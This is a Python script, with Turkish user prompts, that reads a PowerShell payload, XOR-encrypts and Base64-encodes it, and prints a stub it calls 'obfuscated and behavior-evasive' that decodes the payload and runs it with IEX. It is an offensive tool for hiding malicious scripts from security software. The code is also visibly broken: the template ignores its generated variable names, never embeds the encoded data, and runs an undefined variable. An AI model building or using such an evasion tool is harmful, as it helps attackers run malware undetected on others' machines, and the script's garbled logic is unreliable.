import base64
import random
import string
import sys
import textwrap

def random_var(length=6):
    return ''.join(random.choices(string.ascii_letters, k=length))

def xor_encrypt(data: bytes, key: int):
    return bytes([b ^ key for b in data])

def base64_encode(data: bytes) -> str:
    return base64.b64encode(data).decode()

def split_string(s, chunk=8):
    return '+'.join([f'"{s[i:i+chunk]}"' for i in range(0, len(s), chunk)])

def generate_payload(user_code, key=23):
    # Encode as UTF-16LE (needed for PowerShell -enc), then XOR and Base64
    ps_bytes = user_code.encode('utf-16le')
    xored = xor_encrypt(ps_bytes, key)
    b64 = base64_encode(xored)
    b64_split = split_string(b64)

    # Random variable names
    v_b64 = random_var()
    v_bytes = random_var()
    v_dec = random_var()
    v_key = random_var()
    v_out = random_var()

    # Obfuscated PowerShell payload
    payload = f"""
# Obfuscated and behavior-evasive PowerShell Payload
$EExEFW=23;$VxKaBQ=[System.Convert]::FromBase64String($gTmDYy);$WiwQye=for($i=0;$i -lt $VxKaBQ.Length;$i++){$VxKaBQ[$i]-bxor $EExEFW};$oMcPxy=[System.Text.Encoding]::Unicode.GetString($WiwQye);${1..1}|ForEach-Object{IEX $v_out}

""".strip()

    return payload

if __name__ == "__main__":
    print("PowerShell payload kodunu girin. Bittiğinde Ctrl+D (ya da Windows için Ctrl+Z) tuşlayın:\n")
    try:
        ps_input = sys.stdin.read()
    except EOFError:
        print("[!] Girdi okunamadı.")
        sys.exit(1)

    if not ps_input.strip():
        print("[!] Girdi boş.")
        sys.exit(1)

    print("\n[+] Obfuscated PowerShell Payload:\n")
    print(generate_payload(ps_input))

